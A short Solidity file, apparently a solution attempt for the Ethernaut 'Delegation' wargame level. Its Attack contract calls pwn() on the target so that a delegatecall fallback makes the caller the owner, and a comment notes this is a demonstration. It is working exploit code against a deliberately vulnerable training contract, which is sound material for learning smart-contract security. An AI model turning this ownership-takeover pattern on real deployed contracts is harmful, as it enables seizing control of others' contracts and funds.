// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Delegation.sol";

    /*
        1. Attack contract is a demonstration where "Attack contract address" becomes the owner of Delegation.sol.
        2. However this is not the purpose of Ethernaut level 6.
        3. Click on "README.md" to check Level 6 solution.
    */

contract Attack{
    Delegation public delegation;

    constructor(address _delegationAddress) public{
        delegation = Delegation(_delegationAddress);
    }

    function attack() public{
        address(delegation).call(abi.encodeWithSignature("pwn()"));
    }
}